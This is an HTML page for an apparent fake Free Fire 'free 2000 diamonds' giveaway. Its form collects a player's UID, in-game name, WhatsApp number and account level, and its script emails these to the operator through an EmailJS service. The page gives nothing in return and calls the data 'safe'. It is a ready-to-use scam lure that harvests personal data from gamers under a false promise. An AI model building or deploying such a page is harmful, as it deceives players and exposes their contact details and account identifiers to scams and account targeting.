<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Free Fire Giveaway Registration</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #121212;
      color: #eee;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      min-height: 100vh;
      margin: 0;
    }
    h1 {
      margin-bottom: 20px;
      color: #ff3b3b;
      text-shadow: 1px 1px 5px #880000;
    }
    form {
      background: #222;
      padding: 30px;
      border-radius: 10px;
      width: 320px;
      box-shadow: 0 0 15px #ff3b3baa;
    }
    input {
      width: 100%;
      padding: 12px 10px;
      margin: 12px 0;
      border: none;
      border-radius: 6px;
      font-size: 16px;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 5px #ff3b3b;
      background: #333;
      color: #fff;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #ff3b3b;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #cc2c2c;
    }
    .note {
      margin-top: 20px;
      font-size: 14px;
      color: #aaa;
      text-align: center;
    }
  </style>
</head>
<body>
  <h1>GET FREE 2000 DIAMONDS</h1>
  <form id="giveawayForm">
    <input type="text" name="uid" placeholder="UID" required />
    <input type="text" name="ign" placeholder="In-Game Name" required />
    <input type="tel" name="whatsapp" placeholder="WhatsApp Number" required pattern="[0-9]{10,15}" title="Enter valid number" />
    <input type="number" name="accountLevel" placeholder="Account Level" min="1" required />
    <button type="submit">Register Now</button>
  </form>

  <p class="note">* No passwords or sensitive info required. Your data is safe.</p>

  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
  <script>
    (function(){
      emailjs.init('user_Washifali'); // Your EmailJS User ID
    })();

    document.getElementById('giveawayForm').addEventListener('submit', function(e) {
      e.preventDefault();

      emailjs.sendForm('service_1s68kak', '__ejs-test-mail-service__', this)
      .then(function() {
          alert('Thanks for registering! Confirmation sent.');
          e.target.reset();
      }, function(error) {
          alert('Oops... ' + JSON.stringify(error));
      });
    });
  </script>
</body>
</html>
